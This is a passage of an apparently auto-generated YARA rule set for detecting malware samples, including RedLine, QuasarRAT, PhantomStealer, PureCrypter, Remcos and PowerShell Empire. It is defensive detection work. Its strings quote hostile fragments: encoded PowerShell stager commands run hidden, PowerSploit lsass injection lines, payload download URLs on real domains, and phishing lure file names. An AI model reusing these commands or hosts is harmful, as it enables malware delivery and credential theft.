      hash1 = "5d37ed38e6d92f6cafd305db291d6a3db467c92d39e32bf7e6cd4f071fec0e40"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s7 = "~nsu%X.tmp" fullword wide /* score: '11.00'*/
      $s8 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s9 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s10 = "udstener" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule njrat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__df690a76 {
   meta:
      description = "_subset_batch - file njrat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_df690a76.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "df690a7617a5e166f671ca7304281a769b9ef9d96f6d414639e56ef6bf72af80"
   strings:
      $s1 = "smPP.exe" fullword wide /* score: '22.00'*/
      $s2 = "smPP.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "get_CompletedDate" fullword ascii /* score: '12.00'*/
      $s4 = "Please enter a task description." fullword wide /* score: '10.00'*/
      $s5 = "Please select a task and enter a description." fullword wide /* score: '10.00'*/
      $s6 = "get_ModifiedDate" fullword ascii /* score: '9.00'*/
      $s7 = "contentTextBox" fullword ascii /* score: '9.00'*/
      $s8 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
      $s9 = "\"* _ABqW=El" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__134bb156 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_134bb156.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "134bb1561e4210782481eff2ee97e71f70770f39e000d2c0318049947ba16da9"
   strings:
      $s1 = "Anux.exe" fullword wide /* score: '22.00'*/
      $s2 = "Anux.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "ZHHHHH" fullword ascii /* reversed goodware string 'HHHHHZ' */ /* score: '13.50'*/
      $s4 = "get_CompletedDate" fullword ascii /* score: '12.00'*/
      $s5 = "Please enter a task description." fullword wide /* score: '10.00'*/
      $s6 = "Please select a task and enter a description." fullword wide /* score: '10.00'*/
      $s7 = "aRh!!!!!" fullword ascii /* score: '10.00'*/
      $s8 = "5Rh!!!!!" fullword ascii /* score: '10.00'*/
      $s9 = "Rh!!!!!" fullword ascii /* score: '10.00'*/
      $s10 = "wRh!!!!!" fullword ascii /* score: '10.00'*/
      $s11 = "get_ModifiedDate" fullword ascii /* score: '9.00'*/
      $s12 = "contentTextBox" fullword ascii /* score: '9.00'*/
      $s13 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__87a78bd2 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_87a78bd2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87a78bd27eda1a7c573d260e007d7740032b102d7487b77048f23276f365e64f"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADu" fullword ascii /* score: '27.00'*/
      $s2 = "nugf.exe" fullword wide /* score: '22.00'*/
      $s3 = "nugf.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "get_CompletedDate" fullword ascii /* score: '12.00'*/
      $s5 = "Please enter a task description." fullword wide /* score: '10.00'*/
      $s6 = "Please select a task and enter a description." fullword wide /* score: '10.00'*/
      $s7 = "get_ModifiedDate" fullword ascii /* score: '9.00'*/
      $s8 = "contentTextBox" fullword ascii /* score: '9.00'*/
      $s9 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__90439986 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_90439986.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "90439986776b345d31480126e9f24f0c79df25c3f9f1f8ab3bb2981830950150"
   strings:
      $s1 = "YpxF.exe" fullword wide /* score: '22.00'*/
      $s2 = "<GetTotalCompletions>b__10_0" fullword ascii /* score: '12.00'*/
      $s3 = "GetHabitsNotCompletedToday" fullword ascii /* score: '12.00'*/
      $s4 = "<GetHabitCompletions>b__12_0" fullword ascii /* score: '12.00'*/
      $s5 = "<GetHabitsNotCompletedToday>b__14_0" fullword ascii /* score: '12.00'*/
      $s6 = "GetHabitCompletions" fullword ascii /* score: '12.00'*/
      $s7 = "<GetHabitsCompletedToday>b__13_0" fullword ascii /* score: '12.00'*/
      $s8 = "GetTotalCompletions" fullword ascii /* score: '12.00'*/
      $s9 = "<GetHabitCompletions>b__12_1" fullword ascii /* score: '12.00'*/
      $s10 = "GetHabitsCompletedToday" fullword ascii /* score: '12.00'*/
      $s11 = "get_CompletedDates" fullword ascii /* score: '12.00'*/
      $s12 = "GetCompletedTodayCount" fullword ascii /* score: '12.00'*/
      $s13 = "GetTodayCompletionPercentage" fullword ascii /* score: '12.00'*/
      $s14 = "<GetCompletedTodayCount>b__6_0" fullword ascii /* score: '12.00'*/
      $s15 = "System.Windows.Forms.Automation" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f66a4ee1 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f66a4ee1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f66a4ee15f672bbf9259027eb286f369bfa81a3aa979f547415b831d22d031b5"
   strings:
      $x1 = "temploader.exe" fullword wide /* score: '38.00'*/
      $s2 = "temploader" fullword ascii /* score: '24.00'*/
      $s3 = "=QpUspys" fullword ascii /* score: '9.00'*/
      $s4 = "@ZV -k,iQMGzoV" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule QuasarRAT_signature__2 {
   meta:
      description = "_subset_batch - file QuasarRAT(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0ef0e291d71b505ea976fbdacb9ac2cc5562a3a9b5869985cf21202706694308"
   strings:
      $s1 = "svchost.exePK" fullword ascii /* score: '16.00'*/
      $s2 = "yEKD:\"" fullword ascii /* score: '10.00'*/
      $s3 = "=QpUspys" fullword ascii /* score: '9.00'*/
      $s4 = "M%yeyEy>Iu" fullword ascii /* score: '9.00'*/
      $s5 = "% -  %" fullword ascii /* score: '9.00'*/
      $s6 = "3= =<=.=5" fullword ascii /* score: '9.00'*/ /* hex encoded string '5' */
      $s7 = "cvwvvwvvf" fullword ascii /* score: '8.00'*/
      $s8 = "@ZV -k,iQMGzoV" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 8000KB and
      all of them
}

rule QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ddfffb912ac59f774d452516e5834d9e0175db9608e91eba45379a78b3c53fa9"
   strings:
      $x1 = "temploader.exe" fullword wide /* score: '38.00'*/
      $s2 = "temploader" fullword ascii /* score: '24.00'*/
      $s3 = "7gmABH=- -" fullword ascii /* score: '12.00'*/
      $s4 = "=QpUspys" fullword ascii /* score: '9.00'*/
      $s5 = "@ZV -k,iQMGzoV" fullword ascii /* score: '8.00'*/
      $s6 = "wrijwts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule PhantomStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__07f9efd3 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_07f9efd3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "07f9efd37b4c05d3075ca73644493803f856b7fa32e32766334ffd4b92e438ba"
   strings:
      $s1 = "ExecuteConfigurableProcessor" fullword ascii /* score: '29.00'*/
      $s2 = "Dokty.exe" fullword wide /* score: '22.00'*/
      $s3 = "PostExecutor" fullword ascii /* score: '21.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<System.Net.IPAddress>.GetEnumerator" fullword ascii /* score: '21.00'*/
      $s5 = "_IsLoggerProcessor" fullword ascii /* score: '20.00'*/
      $s6 = "EncryptProcessor" fullword ascii /* score: '20.00'*/
      $s7 = "Dokty.Processing" fullword ascii /* score: '18.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<System.Net.IPNetwork>.GetEnumerator" fullword ascii /* score: '18.00'*/
      $s9 = "ProcessCommonTransaction" fullword ascii /* score: '18.00'*/
      $s10 = "_ConfigurableProcessorID" fullword ascii /* score: '18.00'*/
      $s11 = "ExecuteMatcher" fullword ascii /* score: '18.00'*/
      $s12 = "CompareHiddenLogger" fullword ascii /* score: '17.00'*/
      $s13 = "https://primeline.it.com/pure/Wgdhjrjnl.vdf" fullword wide /* score: '17.00'*/
      $s14 = "ValidateStatelessExecutor" fullword ascii /* score: '16.00'*/
      $s15 = "RouteDetachedExecutor" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule PhantomStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__63be0e98 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_63be0e98.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "63be0e987b9412c3e04e5f09a5b7d2cc05d1a7772d887c1e21ffac62287498cc"
   strings:
      $s1 = "Utiwjsp.exe" fullword wide /* score: '22.00'*/
      $s2 = "System.Collections.Generic.IEnumerable<System.Net.IPAddress>.GetEnumerator" fullword ascii /* score: '21.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<System.Net.IPNetwork>.GetEnumerator" fullword ascii /* score: '18.00'*/
      $s4 = "Mqxfvuij.Processing" fullword ascii /* score: '18.00'*/
      $s5 = "EncryptorReporter" fullword ascii /* score: '17.00'*/
      $s6 = "https://primeline.it.com/pure/Muxshpkqmi.dat" fullword wide /* score: '17.00'*/
      $s7 = "decryptor" fullword wide /* score: '15.00'*/
      $s8 = "LinkLocalExecutor" fullword ascii /* score: '15.00'*/
      $s9 = "BuildEncryptor" fullword ascii /* score: '14.00'*/
      $s10 = "LinkExpandableLogger" fullword ascii /* score: '14.00'*/
      $s11 = "RunDecryptor" fullword ascii /* score: '14.00'*/
      $s12 = "m_ChooserEncryptor" fullword ascii /* score: '14.00'*/
      $s13 = "ConfigurableDecryptor" fullword ascii /* score: '14.00'*/
      $s14 = "DisconnectRandomEncryptor" fullword ascii /* score: '14.00'*/
      $s15 = "LinkSequentialCommand" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__904ffdd4 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_904ffdd4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "904ffdd4c6d426c95a2d6cb8bd7b73d15eb8e5fee21cace286664bf00bb49ed0"
   strings:
      $s1 = "https://suporte.chapeco.sc.gov.br/Wfgvrufxgl.dat" fullword wide /* score: '17.00'*/
      $s2 = "PO-UYR-2025-788675452356568989876098.exe" fullword wide /* score: '16.00'*/
      $s3 = "<InvokeType>b__0" fullword ascii /* score: '8.00'*/
      $s4 = "InvokeType" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      all of them
}

rule PhantomStealer_signature_ {
   meta:
      description = "_subset_batch - file PhantomStealer(signature).gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "401acdc9361c2358ab84e5860adce7aa24422fdc584e9109d7c8feec0c45628b"
   strings:
      $s1 = "*ENQ-PO#40KDB900-Materials-Spec-Details.exe" fullword ascii /* score: '19.00'*/
      $s2 = "*ENQ-PO#40KDB900-Materials-Spec-Details.txt" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 70KB and
      all of them
}

rule PhantomStealer_signature__2 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c892c8668ba311e2d29d127f2baec94afd6ac1308afa9a977c6d7a6eae5623bc"
   strings:
      $s1 = "RFQ-200KRFx 4000209650.exe" fullword ascii /* score: '19.00'*/
      $s2 = "RFQ-200KRFx 4000209650.txt" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 70KB and
      all of them
}

rule PhantomStealer_signature__533c57a4 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_533c57a4.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "533c57a4282a151a8c8e4170eeb0fd751e33744bf2cbd8cdb40d71c90b01a448"
   strings:
      $s1 = ".Sales_AQS RFQ-1180-25-Spec-Outlined-BD7009.exe" fullword ascii /* score: '19.00'*/
      $s2 = ".Sales_AQS RFQ-1180-25-Spec-Outlined-BD7009.txt" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 70KB and
      all of them
}

rule PhantomStealer_signature__3 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature).tar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1572ddaf43ba8c4dfd433656b4ba16e60f6950b31a4ed4c980320df526b9ce12"
   strings:
      $s1 = "(DHL-SHIPPING DOCUMENTS-GLOBALIMAGING.exe" fullword ascii /* score: '22.00'*/
      $s2 = "(DHL-SHIPPING DOCUMENTS-GLOBALIMAGING.txt" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 100KB and
      all of them
}

rule PhantomStealer_signature__4 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e93b86f2194ec57df80dfd43ab6a050a06b816569b2d4242549e539197f29cc9"
   strings:
      $s1 = "RE INQUIRY  YTR-0109-25.exe" fullword ascii /* score: '19.00'*/
      $s2 = "RE INQUIRY  YTR-0109-25.txt" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 100KB and
      all of them
}

rule PhantomStealer_signature__23189ed6 {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_23189ed6.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "23189ed612ac144d409f9a3256c324fcc669283b9d16d61831dc48d430c8c20f"
   strings:
      $s1 = "*RFQ-BECRISA-PROJECT SPECIFICATIONS REQ.exe" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 100KB and
      all of them
}

rule PhantomStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file PhantomStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b31084837bcfd507c18495ea053b0b234b06404e5c97b527866a8e43268c4c59"
   strings:
      $s1 = "ExecuteHiddenCommand" fullword ascii /* score: '26.00'*/
      $s2 = "Sunrdwuxic.Execution" fullword ascii /* score: '23.00'*/
      $s3 = "Sunrdwuxic.exe" fullword wide /* score: '22.00'*/
      $s4 = "https://primeline.it.com/pure/Yoqza.dat" fullword wide /* score: '17.00'*/
      $s5 = "decryptor" fullword wide /* score: '15.00'*/
      $s6 = "m_VisitorLogger" fullword ascii /* score: '14.00'*/
      $s7 = "CheckDetailedEncryptor" fullword ascii /* score: '14.00'*/
      $s8 = "Sunrdwuxic.RecommendationSystems" fullword ascii /* score: '13.00'*/
      $s9 = "LogRemoteRecord" fullword ascii /* score: '12.00'*/
      $s10 = "ForceEditableCommand" fullword ascii /* score: '12.00'*/
      $s11 = "ConcreteCommand" fullword ascii /* score: '12.00'*/
      $s12 = "m_CommandModule" fullword ascii /* score: '12.00'*/
      $s13 = "isBufferCommand" fullword ascii /* score: '12.00'*/
      $s14 = "PostRecommender" fullword ascii /* score: '12.00'*/
      $s15 = "isGroupedCommand" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f8ad03c7 {
   meta:
      description = "_subset_batch - file PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f8ad03c7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f8ad03c7205a0923a84cd91b20f674e15ce6915083f04a49ea4524d17e410744"
   strings:
      $s1 = "Yjfst.exe" fullword wide /* score: '22.00'*/
      $s2 = "m_EncryptorExecutorObj" fullword ascii /* score: '21.00'*/
      $s3 = "ExecuteStream" fullword ascii /* score: '18.00'*/
      $s4 = "https://guantessanpedro.com/Acylot.mp4" fullword wide /* score: '17.00'*/
      $s5 = "CYjfst, Version=1.0.1286.24923, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s6 = "decryptor" fullword wide /* score: '15.00'*/
      $s7 = "ReadConfigurableStream" fullword ascii /* score: '10.00'*/
      $s8 = "Yjfst.Threading" fullword ascii /* score: '10.00'*/
      $s9 = "m_OperationalRoleData" fullword ascii /* score: '9.00'*/
      $s10 = "operationalEvaluatorMsg" fullword ascii /* score: '9.00'*/
      $s11 = "SubmitOperationalTransmitter" fullword ascii /* score: '9.00'*/
      $s12 = "LogFilteredTracer" fullword ascii /* score: '9.00'*/
      $s13 = "PostStream" fullword ascii /* score: '9.00'*/
      $s14 = "InvokeConsumer" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d3dd9ec0 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d3dd9ec0.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d3dd9ec079c3c60239c8c36c4bd1d097497d8cc097004a06221236c7d989e752"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "Zgluu.exe" fullword wide /* score: '22.00'*/
      $s3 = "CZgluu, Version=1.0.2649.22087, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s5 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s6 = "_getBuffer" fullword ascii /* score: '9.00'*/
      $s7 = ">5%#4\")`" fullword ascii /* score: '9.00'*/ /* hex encoded string 'T' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__093d91b5 {
   meta:
      description = "_subset_batch - file PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_093d91b5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "093d91b5a964cd5cac944dd4afd359012bd254be907abb454bb057028b5583a4"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "https://stacysublett.com/wp-content/plugins/Sykpwzmepy.vdf" fullword wide /* score: '22.00'*/
      $s3 = "KSMV-NEW-30065-PKRM2107652907.exe" fullword wide /* score: '19.00'*/
      $s4 = "[KSMV-NEW-30065-PKRM2107652907, Version=1.0.3564.25992, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s5 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s6 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s7 = "_getBuffer" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      all of them
}

rule PureLogsStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0473d5cb {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0473d5cb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0473d5cb8e02a5b10a1f8f21e110c74565603b2547b6cebac1f5f535fe066c20"
   strings:
      $s1 = "NCryptSharp.SCryptSubset, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '28.00'*/
      $s2 = "malay crypted.exe" fullword wide /* score: '19.00'*/
      $s3 = "Jmalay crypted, Version=1.0.1748.4173, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '16.00'*/
      $s4 = "ComputeDerivedKey" fullword ascii /* score: '10.00'*/
      $s5 = "GetEffectivePbkdf2Salt" fullword ascii /* score: '9.00'*/
      $s6 = "_getBuffer" fullword ascii /* score: '9.00'*/
      $s7 = ",%+ -~" fullword ascii /* score: '9.00'*/
      $s8 = "get_Slxcrxnbkg" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule PowershellEmpire_signature_ {
   meta:
      description = "_subset_batch - file PowershellEmpire(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "93fbf17f966abe2ffcd2680a95a383e35ec85c07a86b53536afc2c4581346c91"
   strings:
      $s1 = "command = \"powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAFIAUwBJAG8AbgBUAEEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8ATgAuAE0AQQBq" ascii /* score: '29.00'*/
      $s2 = "command = \"powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAFIAUwBJAG8AbgBUAEEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8ATgAuAE0AQQBq" ascii /* score: '25.00'*/
      $s3 = "objShell.Run command,0" fullword ascii /* score: '23.00'*/
      $s4 = "Set objShell = WScript.CreateObject(\"WScript.Shell\")" fullword ascii /* score: '12.00'*/
      $s5 = "GMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAGEAbAB1AEUAKAAkAE4AdQBMAEwALAAkAFQAUgB1AGUAKQA7AH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAFQALgBTA" ascii /* score: '11.00'*/
      $s6 = "DIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AdABdACkAJQAyADUANgA7A" ascii /* score: '11.00'*/
      $s7 = "GEAdABhAFsAMAAuAC4AMwBdADsAJABEAEEAVABBAD0AJABkAEEAVABBAFsANAAuAC4AJABEAGEAVABhAC4AbABFAG4AZwBUAGgAXQA7AC0ASgBPAGkATgBbAEMAaABhA" ascii /* score: '11.00'*/
      $s8 = "CQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7A" ascii /* score: '11.00'*/
      $s9 = "F8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADgAZgA1AGIAOQAuAEgAZQBBAGQARQByAFMALgBBA" ascii /* score: '11.00'*/
      $s10 = "EQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAawBFAEMASQBpAHoASQBGAFEAegA9ADEATwB0AEIAbwBEAHEAbwByAE4AagBJAHQAYwBkAE4AYwBvAEkAZQBDADIAdgBoA" ascii /* score: '11.00'*/
      $s11 = "CQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkA" ascii /* score: '11.00'*/
      $s12 = "Dim objShell" fullword ascii /* score: '9.00'*/
      $s13 = "Set objShell = Nothing" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6944 and filesize < 20KB and
      8 of them
}

rule PowerSploit_signature_ {
   meta:
      description = "_subset_batch - file PowerSploit(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d429f4de69ad3930529e9480af003368d7e3bc383461aa68ee5c29db733adfe2"
   strings:
      $x1 = "Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local" fullword ascii /* score: '45.00'*/
      $x2 = "Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/" fullword ascii /* score: '42.00'*/
      $x3 = "Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using" ascii /* score: '41.00'*/
      $x4 = "Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)" fullword ascii /* score: '38.00'*/
      $x5 = "Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local" fullword ascii /* score: '37.00'*/
      $x6 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii /* score: '37.00'*/
      $x7 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp" fullword ascii /* score: '37.00'*/
      $x8 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii /* score: '37.00'*/
      $x9 = "Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection" fullword ascii /* score: '37.00'*/
      $x10 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp" fullword ascii /* score: '37.00'*/
      $x11 = "Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString" fullword ascii /* score: '36.00'*/
      $x12 = "Invoke-ReflectivePEInjection -PEPath (Get-Content c:\\DemoEXE.exe -Encoding Byte) -ExeArgs \"Arg1 Arg2 Arg3 Arg4\"" fullword ascii /* score: '36.00'*/
      $x13 = "Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print" fullword ascii /* score: '35.00'*/
      $x14 = "#If a remote process to inject in to is specified, get a handle to it" fullword ascii /* score: '34.00'*/
      $x15 = "Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this." fullword ascii /* score: '34.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 400KB and
      1 of ($x*)
}

rule RemcosRAT_signature__2 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f9801af08f463240448e41a1fc1a95ce748b3cc68af0db7b422ea9d18572119c"
   strings:
      $x1 = "$encryptedPayload = 'Qeco/1mfoCD9W6tTPSpJvmIZoERhzriBijm5tTtbi+euwL0bnSB+MaRhjSv2bSe0+pF9L1ee8/bDhoPRmng6RS998+5QNL+c3IjsT3EhmvC" ascii /* score: '66.00'*/
